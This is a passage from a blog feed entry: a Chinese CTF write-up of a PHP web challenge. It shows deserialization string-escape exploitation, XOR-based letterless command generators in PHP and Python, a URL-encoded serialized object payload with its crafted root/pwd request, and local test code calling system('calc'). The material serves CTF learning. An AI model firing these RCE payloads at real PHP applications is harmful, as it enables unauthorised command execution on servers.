class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;root);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;pwd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;root) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;pwd)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Hello, <span class="subst">$this</span>-&gt;root&lt;/h1&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;out!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>开始代码审计</strong></p><p><img src="../images/image-20230724162222075.png" alt="image-20230724162222075"></p><p><strong>首先是在<code>index.php</code>处进行序列化操作 </strong>   <strong>然后在用b函数进行替换操作</strong></p><p><img src="../images/image-20230724162404370.png" alt="image-20230724162404370"></p><p><strong>最后是在这个<code>login.php</code>处先将序列化字符串进行a函数替换  然后再进行反序列化</strong></p><p><strong>命令执行是在这个地方</strong></p><p><img src="../images/image-20230724162637962.png" alt="image-20230724162637962"></p><p>就是在<code>my.php</code>这个里面  其实就是无数字字母RCE  但是这不是关键  关键是如何进行<strong>序列化字符串逃逸</strong></p><p><strong>先使用之前羽师傅写的一个异或脚本来生成自己想要执行的命令</strong></p><p><strong>xor.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>xor.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>使用方法就是先使用php生成字典  然后再使用python来生成自己想要的命令</strong></p><p><img src="../images/image-20230724163944186.png" alt="image-20230724163944186"></p><p>然后开始构造链子</p><p><img src="../images/image-20230724164349115.png" alt="image-20230724164349115"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">&quot;pull_it&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;pull_itx&quot;</span>;s:<span class="number">41</span>:<span class="string">&quot;(&quot;</span> <span class="string">&quot;^&quot;</span>&#123;&#123;&#123;|``<span class="string">&quot;)(&quot;</span><span class="string">&quot;^&quot;</span>``| /`*<span class="string">&quot;);&quot;</span>;&#125;</span><br><span class="line"><span class="comment">//没编码前</span></span><br><span class="line">O%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>pull_it%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>pull_it%<span class="number">00</span>x%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A41%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">28</span>%<span class="number">22</span>%<span class="number">08</span>%<span class="number">02</span>%<span class="number">08</span>%<span class="number">08</span>%<span class="number">05</span>%<span class="number">0</span>D%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">7</span>B%<span class="number">7</span>B%<span class="number">7</span>B%<span class="number">7</span>C%<span class="number">60</span>%<span class="number">60</span>%<span class="number">22</span>%<span class="number">29</span>%<span class="number">28</span>%<span class="number">22</span>%<span class="number">03</span>%<span class="number">01</span>%<span class="number">08</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">06</span>%<span class="number">00</span>%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">60</span>%<span class="number">60</span>%<span class="number">7</span>C+%<span class="number">2</span>F%<span class="number">60</span>%<span class="number">2</span>A%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line"><span class="comment">//编码后                                                 </span></span><br></pre></td></tr></table></figure><p><strong>因为这里的是因为不能传入这个<code>pull_it</code>这个类直接进行反序列化</strong></p><p><img src="../images/image-20230724190117444.png" alt="image-20230724190117444"></p><p><strong>所以说我们就得尝试进行字符逃逸  把这个序列化后的结果加进去</strong></p><p>开始逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&amp;pwd=<span class="string">&quot;;s:5:&quot;</span>datou<span class="string">&quot;;O%3A7%3A%22pull_it%22%3A1%3A%7Bs%3A10%3A%22%00pull_it%00x%22%3Bs%3A41%3A%22%28%22%08%02%08%08%05%0D%22%5E%22%7B%7B%7B%7C%60%60%22%29%28%22%03%01%08%00%00%06%00%22%5E%22%60%60%7C+%2F%60%2A%22%29%3B%22%3B%7D</span></span><br></pre></td></tr></table></figure><p>(逃逸了14个字符)</p><p>这里解释一下</p><p><img src="../images/image-20230724190419607.png" alt="image-20230724190419607"></p><p><strong>刚好是14个  其实也可以不是14个  这要看你自己的构造了</strong></p><p>先使用常规的方法生成一下实例化的内容·</p><p><img src="../images/image-20230724190736840.png" alt="image-20230724190736840"></p><p><code>aa</code>是我们<code>root</code>传入的位置  <code>bb</code>是我们<code>pwd</code>传入的位置  </p><p><img src="../images/image-20230724190920747.png" alt="image-20230724190920747"></p><p>这是<strong>payload</strong>   这里一共传入了<strong>82个b</strong>字符   经过这个反序列化的时候 <strong>a函数</strong>的替换</p><p><img src="../images/image-20230724191030189.png" alt="image-20230724191030189"></p><p>会变成42个字符a   于是给我们提供了42位的逃逸空间</p><p>于是我们就可以查看</p><p><img src="../images/image-20230724191238844.png" alt="image-20230724191238844"></p><p><img src="../images/image-20230724191508816.png" alt="image-20230724191508816"></p><p>然后就是<code>13+29==42</code>就会成功逃逸成功  后面跟着<code>pull_it</code>这个序列化后的恶意类</p><p>因为逃逸的关系  (<strong>原本的<code>pwd</code>参数也变成了<code>root</code>的值，然后又添加进来一个<code>datou</code>，刚好满足两个参数的要求</strong>)</p><p>于是就成功逃逸出来了(<strong>后面多出来的一些字符并不影响 并且直接添加一个序列化后的类也是可以反序列化的</strong> )</p><p><img src="../images/image-20230724191908997.png" alt="image-20230724191908997"></p><p><strong>本地测试过了</strong>  </p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ul><li><strong>重新温习了字符串逃逸这个知识点</strong></li><li><strong>学到了这个在一个序列化后的字符串后面继续添加一个别的类的序列化字符串也是可以一起进行反序列化</strong></li></ul><p><strong>测试过程的代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$system</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$command</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$s</span>,<span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;system = <span class="variable">$s</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;command = <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(calc));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;calc&#x27;</span>);</span><br><span class="line"><span class="comment">//echo serialize($t);</span></span><br><span class="line"><span class="comment">//O:4:&quot;test&quot;:2:&#123;s:6:&quot;system&quot;;s:6:&quot;system&quot;;s:7:&quot;command&quot;;s:4:&quot;calc&quot;;&#125;</span></span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;aa&#x27;</span>,<span class="string">&#x27;bb&#x27;</span>);</span><br><span class="line"><span class="comment">//echo serialize($u);</span></span><br><span class="line"><span class="comment">//O:4:&quot;user&quot;:2:&#123;s:8:&quot;username&quot;;s:2:&quot;aa&quot;;s:8:&quot;password&quot;;s:2:&quot;bb&quot;;O:4:&quot;test&quot;:2:&#123;s:6:&quot;system&quot;;s:6:&quot;system&quot;;s:7:&quot;command&quot;;s:4:&quot;calc&quot;;&#125;&#125;</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;user&quot;:2:&#123;s:8:&quot;username&quot;;s:2:&quot;aa&quot;;s:8:&quot;password&quot;;s:2:&quot;bb&quot;;O:4:&quot;test&quot;:2:&#123;s:6:&quot;system&quot;;s:6:&quot;system&quot;;s:7:&quot;command&quot;;s:4:&quot;calc&quot;;&#125;&quot;&quot;;&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;BabyURL&quot;&gt;&lt;a href=&quot;#BabyURL&quot; class=&quot;headerlink&quot; title=&quot;BabyURL&quot;&gt;&lt;/a&gt;BabyURL&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;审计代码得出一个思路&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;就是在反序列化的时候会将得到的</summary>
      
    
    
    
    
    <category term="巅峰极客2023-Web" scheme="https://ke1nys.github.io/tags/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023-Web/"/>
    
  </entry>
  
</feed>
